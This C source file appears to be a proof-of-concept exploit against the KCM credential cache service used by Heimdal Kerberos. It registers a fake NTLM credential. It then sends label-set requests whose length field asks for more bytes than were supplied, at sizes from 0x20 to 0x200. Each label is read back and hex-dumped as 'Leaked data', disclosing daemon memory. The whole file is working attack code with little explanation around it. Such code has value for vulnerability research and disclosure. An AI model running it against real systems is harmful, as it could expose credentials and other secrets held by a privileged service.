#include <stdio.h>
#include <stdint.h>

typedef enum kcm_operation {
	KCM_OP_NOOP,
	KCM_OP_GET_NAME,
	KCM_OP_RESOLVE,
	KCM_OP_DEPRECATED_GEN_NEW,
	KCM_OP_INITIALIZE,
	KCM_OP_DESTROY,
	KCM_OP_STORE,
	KCM_OP_RETRIEVE,
	KCM_OP_GET_PRINCIPAL,
	KCM_OP_GET_CRED_UUID_LIST,
	KCM_OP_GET_CRED_BY_UUID,
	KCM_OP_REMOVE_CRED,
	KCM_OP_SET_FLAGS,
	KCM_OP_CHOWN,
	KCM_OP_CHMOD,
	KCM_OP_GET_INITIAL_TICKET,
	KCM_OP_GET_TICKET,
	KCM_OP_MOVE_CACHE,
	KCM_OP_GET_CACHE_UUID_LIST,
	KCM_OP_GET_CACHE_BY_UUID,
	KCM_OP_GET_DEFAULT_CACHE,
	KCM_OP_SET_DEFAULT_CACHE,
	KCM_OP_GET_KDC_OFFSET,
	KCM_OP_SET_KDC_OFFSET,
	KCM_OP_RETAIN_KCRED,
	KCM_OP_RELEASE_KCRED,
	KCM_OP_GET_UUID,
	/* NTLM operations */
	KCM_OP_ADD_NTLM_CRED,
	KCM_OP_HAVE_NTLM_CRED,
	KCM_OP_ADD_NTLM_CHALLENGE,
	KCM_OP_DO_NTLM_AUTH,
	KCM_OP_GET_NTLM_USER_LIST,
	/* SCRAM */
	KCM_OP_ADD_SCRAM_CRED,
	KCM_OP_HAVE_SCRAM_CRED,
	KCM_OP_DEL_SCRAM_CRED,
	KCM_OP_DO_SCRAM_AUTH,
	KCM_OP_GET_SCRAM_USER_LIST,
	/* GENERIC */
	KCM_OP_DESTROY_CRED,
	KCM_OP_RETAIN_CRED,
	KCM_OP_RELEASE_CRED,
	KCM_OP_CRED_LABEL_GET,
	KCM_OP_CRED_LABEL_SET,
	/* */
	KCM_OP_CHECK_NTLM_CHALLENGE,
	KCM_OP_GET_CACHE_PRINCIPAL_LIST,
	KCM_OP_MAX
} kcm_operation;

typedef int32_t krb5_error_code;
typedef unsigned char krb5_uuid[16];

struct heim_base_data {
	size_t length;
	void *data;
};

typedef struct heim_base_data heim_octet_string;
typedef heim_octet_string krb5_data;

krb5_error_code krb5_init_context(void* context);
krb5_error_code krb5_kcm_storage_request(void* context, uint16_t opcode, void** storage);
krb5_error_code krb5_store_uuid(void* storage, krb5_uuid uuid);
krb5_error_code krb5_store_int8(void* *storage, int8_t value);
krb5_error_code krb5_store_int32(void* storage, int32_t len);
krb5_error_code krb5_store_uint32(void* storage, uint32_t len);
krb5_error_code krb5_store_stringz(void* storage, const char* str);
krb5_error_code krb5_store_string(void* storage, const char* str);
krb5_error_code krb5_store_data(void* storage, krb5_data data);
krb5_error_code krb5_ret_uuid(void *storage, krb5_uuid uuid);
krb5_error_code krb5_ret_int32(void *storage, int32_t *value);
krb5_error_code krb5_ret_uint32(void *storage, uint32_t *value);
krb5_error_code krb5_ret_stringz(void *storage, char **string);
krb5_error_code krb5_ret_string(void *storage, char **string);
krb5_error_code krb5_ret_data(void *storage, krb5_data *data);
krb5_error_code krb5_kcm_call(void* context, void* request, void* response, krb5_data* response_data);

void hexDump (const char * desc, const void * addr, const int len) {
    int i;
    unsigned char buff[17];
    const unsigned char * pc = (const unsigned char *)addr;

    // Output description if given.

    if (desc != NULL)
        printf ("%s:\n", desc);

    // Length checks.

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    else if (len < 0) {
        printf("  NEGATIVE LENGTH: %d\n", len);
        return;
    }

    // Process every byte in the data.

    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Don't print ASCII buffer for the "zeroth" line.

            if (i != 0)
                printf ("  %s\n", buff);

            // Output the offset.

            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And buffer a printable ASCII character for later.

        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.

    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII buffer.

    printf ("  %s\n", buff);
}


void add_cred(void* krb_context, char* name, krb5_uuid out_uuid)
{
	void* storage = NULL;
	krb5_error_code err = 0;
	err = krb5_kcm_storage_request(krb_context, KCM_OP_ADD_NTLM_CRED, &storage);

	// fake nthash, contents don't actually matter
	krb5_data nthash;
	nthash.length = 4;
	nthash.data = "AAAA";

	err = krb5_store_stringz(storage, name); // user
	err = krb5_store_stringz(storage, "debug"); // domain
	err = krb5_store_data(storage, nthash); // fake hash


	// send the message
	void* response = NULL;
	krb5_data response_data;

	err = krb5_kcm_call(krb_context, storage, &response, &response_data);
	//printf("msg: call err %i\n", err);

	krb5_ret_uuid(response, out_uuid);
}

uint32_t sizes[] = {0x20, 0x40, 0x60, 0x80, 0x100, 0x200};
#define SIZES_COUNT (sizeof(sizes) / sizeof(uint32_t))

int main(int argc, char** argv)
{
	void* krb_context = NULL;
	krb5_error_code err = 0;

	// set up our connection
	err = krb5_init_context(&krb_context);
	printf("err: %i ctx: %p\n", err, krb_context);

	krb5_uuid cred_id = {0};
	add_cred(krb_context, "cool_leak", cred_id);
	hexDump("Cred id", cred_id, sizeof(cred_id));

	for(uint32_t i = 0; i < SIZES_COUNT; i++)
	{
		// set up our malformed message
		void* storage = NULL;
		err = krb5_kcm_storage_request(krb_context, KCM_OP_CRED_LABEL_SET, &storage);
		printf("msg1 err: %i storage: %p\n", err, storage);

		char buf_label[0x10];
		sprintf(buf_label, "buf_%i", sizes[i]);

		err = krb5_store_uuid(storage, cred_id);
		err = krb5_store_stringz(storage, buf_label);
		err = krb5_store_int32(storage, sizes[i]); // put the number of bytes we want to leak

		// send the message
		void* response = NULL;
		krb5_data response_data;
		err = krb5_kcm_call(krb_context, storage, &response, &response_data);
		printf("msg1: call err %i\n", err);


		// send the GET request to leak the data back
		storage = NULL;
		err = krb5_kcm_storage_request(krb_context, KCM_OP_CRED_LABEL_GET, &storage);
		printf("msg2 err: %i storage: %p\n", err, storage);
		err = krb5_store_uuid(storage, cred_id);
		err = krb5_store_stringz(storage, buf_label);
		response = NULL;	
		err = krb5_kcm_call(krb_context, storage, &response, &response_data);
		printf("msg2: call err %i\n", err);

		krb5_data leak_data = {0};
		krb5_ret_data(response, &leak_data);
		hexDump("Leaked data", leak_data.data, leak_data.length);

	}


	return 0;
}
